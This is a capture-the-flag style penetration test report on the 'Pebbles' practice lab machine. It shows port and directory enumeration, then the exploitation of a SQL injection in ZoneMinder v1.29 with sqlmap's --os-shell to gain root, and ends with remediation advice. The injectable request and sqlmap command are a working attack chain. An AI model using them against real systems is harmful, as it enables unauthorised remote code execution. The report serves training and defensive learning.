# PG Practice Pebbles - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-10

---

## 0. Lesson Learned

Be patient with time-based SQL queries.

---

## 1. Executive Summary

A penetration test was conducted against the target system "Pebbles". The assessment identified a critical SQL injection vulnerability in the ZoneMinder application, which allowed remote code execution and full system compromise.

---

## 2. Scope

- **Target:** 192.168.194.52
- **Environment:** PG Practice Pebbles
- **Testing Window:** 2026-4-10
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted.

Command:

```
nmap -p- -sC -sV 192.168.162.52 -T4 -oA pebbles_tcp
```

Output (relevant):

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
3305/tcp open  http    Apache httpd 2.4.18
8080/tcp open  http    Apache httpd 2.4.18 (Tomcat)
```

Interpretation:
Multiple services were exposed, including web applications on ports 80, 3305, and 8080, indicating a large attack surface.

---

## 5. Enumeration

### FTP Enumeration

Command:

```
ftp 192.168.162.52
```

Output:

```
530 Login incorrect.
```

Interpretation:
Anonymous FTP access was not allowed.

### Web Enumeration

Port 80
- Login page discovered
Port 3305
- Default Apache page
Port 8080
- Apache Tomcat interface

### Directory Enumeration

Command:

```
gobuster dir -u http://192.168.162.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

Output (relevant):

```
/zm
```

Interpretation:
The `/zm` endpoint was discovered, indicating ZoneMinder installation.

### Application Enumeration

ZoneMinder version identified:

```
ZoneMinder v1.29
```

Interpretation:
This version is known to be vulnerable to SQL injection.

---

## 6. Initial Access

A SQL injection vulnerability in the ZoneMinder application was exploited using a captured HTTP request.

### Capturing Request

The HTTP request to the vulnerable endpoint was saved to a file.

File:

```
zm-request.txt
```

Relevant Content:

```
POST /zm/index.php HTTP/1.1
Host: 192.168.162.52
Content-Type: application/x-www-form-urlencoded

view=request&request=log&task=query&limit=100&minTime=1466674406.084434
```

Interpretation:
The limit parameter was identified as injectable.

### SQL Injection via SQLMap

Command:

```
sqlmap -r zm-request.txt -p limit --dbs --hex --os-shell
```

Output (relevant):

```
Parameter 'limit' is vulnerable
back-end DBMS: MySQL
os-shell available
```

Interpretation:
SQLMap confirmed the SQL injection vulnerability and provided OS command execution capability.

### OS Shell Access

Command:

```
os-shell> whoami
```

Output:

```
root
```

Interpretation:
The OS shell was obtained with root privileges, indicating the database service was running as root or allowed command execution as root.

---

## 7. Post-Exploitation

Post-exploitation was conducted from a root-level OS shell.

### System Verification

Command:

```
os-shell> hostname
```

Output:

```
pebbles
```

Command:

```
os-shell> id
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Interpretation:
Full administrative privileges were confirmed.

---

## 8. Privilege Escalation

No privilege escalation was required.

Interpretation:
Initial access was achieved directly as the root user due to insecure configuration of the database-backed application.

---

## 9. Proof of Compromise

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** SQL Injection Leading to Operating System Command Execution

**Severity:** Critical

**Description:**
The application was vulnerable to SQL injection, allowing attackers to manipulate database queries and leverage database functionality to execute operating system commands.

**Impact:**
Attackers could achieve remote code execution on the underlying system, potentially as a highly privileged user, resulting in full system compromise.

**Recommendation:**
Use parameterized queries and prepared statements, restrict database privileges, ensure database and application services do not run with elevated privileges, and apply security patches to vulnerable software.

---

## 11. Appendix

ZoneMinder v1.29 SQL Injection Exploit - 
[https://www.exploit-db.com/exploits/41239](https://www.exploit-db.com/exploits/41239)